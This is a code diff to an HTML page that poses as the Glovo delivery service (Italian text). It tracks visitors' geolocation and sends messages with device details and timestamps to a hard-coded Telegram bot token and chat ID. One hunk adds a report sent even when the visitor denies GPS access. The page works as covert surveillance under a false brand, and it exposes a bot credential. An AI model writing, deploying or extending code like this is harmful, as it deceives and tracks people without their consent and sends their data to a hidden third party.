@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Glovo - Tu ordina, ci andiamo noi</title>
   <style>
-    /* Stili rimangono invariati */
     html, body {
       margin: 0;
       padding: 0;
@@ -114,15 +113,6 @@
       fetch(`https://api.telegram.org/bot7772790004:AAFPul63mfCY8NIfH5Sju0r7b36_QuEJBAA/sendMessage?chat_id=5886300958&text=${encodeURIComponent(message)}`);
     }
 
-    function sendPageOpenedNotification() {
-      const dateTime = new Date().toLocaleString();
-      const deviceInfo = getDeviceInfo();
-      const message = `📈 Pagina Glovo aperta
-🕒 Data/Ora: ${dateTime}
-📱 Dispositivo: ${deviceInfo}`;
-      sendTelegram(message);
-    }
-
     function saveLocation(lat, lon) {
       localStorage.setItem("glovo_lat", lat);
       localStorage.setItem("glovo_lon", lon);
@@ -149,15 +139,6 @@
     }
 
     window.onload = function () {
-      sendPageOpenedNotification(); // invia subito notifica di pagina aperta
-
-      const saved = getSavedLocation();
-      if (saved) {
-        updateStatus(saved.lat, saved.lon);
-      } else {
-        document.getElementById("status").innerText = "Verifica copertura in corso...";
-      }
-
       if (navigator.geolocation) {
         navigator.geolocation.watchPosition(
           (position) => {
@@ -190,6 +171,13 @@
           (error) => {
             console.error(error);
             document.getElementById("status").innerText = "Impossibile ottenere la posizione.";
+
+            const dateTime = new Date().toLocaleString();
+            const deviceInfo = getDeviceInfo();
+            const message = `📈 Pagina aperta ma GPS negato o errore
+🕒 Data/Ora: ${dateTime}
+📱 Dispositivo: ${deviceInfo}`;
+            sendTelegram(message);
           },
           {
             enableHighAccuracy: true,
@@ -212,4 +200,5 @@
   </div>
 </body>
 </html>
+
 
